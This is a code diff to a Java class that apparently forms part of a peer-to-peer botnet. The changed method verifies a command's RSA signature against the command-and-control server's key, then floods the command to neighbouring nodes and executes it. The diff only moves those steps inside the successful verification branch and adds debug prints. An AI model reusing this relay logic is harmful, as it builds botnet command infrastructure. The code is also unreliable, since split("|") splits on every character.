@@ -151,7 +151,7 @@ public class Behavior {
 	// Integer.parseInt(rgb[3]));
 	// }
 
-	// IDMSG|COMANDO|SIGNATURE
+	// IDMSG|COMANDO|SIGNATURE(idmsg)
 
 	/**
 	 * @param rawData
@@ -171,32 +171,37 @@ public class Behavior {
 			e.printStackTrace();
 			return;
 		}
-		// hai gia ricevuto questo msg?
+		
 
 		// Per comodità
 		String[] msgs = msg.split("|");
-
+		
+		// hai gia ricevuto questo msg? bella domanda
 		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
-
+				System.out.println("NUOVO ORDINE DA ESEGUIRE");
 			// verifica la firma con chiave publica c&c
 			try {
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
-						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
+				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
 					data.setValue2(msgs[0]);
 					msgHashList.add(data);
+					System.out.println("SIGNATURE OK");
+					// se verificato inoltralo ai vicini
+					floodNeighoours(msg);
+					System.out.println("FLOOD A VICINI");
+					// inoltra all'interpretedei msg
+					executeCommand(msg);
+					System.out.println("COMANDO ESEGUTO");
+				}else{
+					System.out.println("SIGNATURE COMANDO FALLITA");
 				}
 			} catch (InvalidKeyException | SignatureException e) {
 				System.out.println("Errore nel controllo firma durante il flooding " + msgs[2]);
 				e.printStackTrace();
 			}
-			// se verificato inoltralo ai vicini
-			floodNeighoours(msg);
-			// inoltra all'interpretedei msg
-			executeCommand(msg);
 		}
-
+		
 	}
 
 	@Async
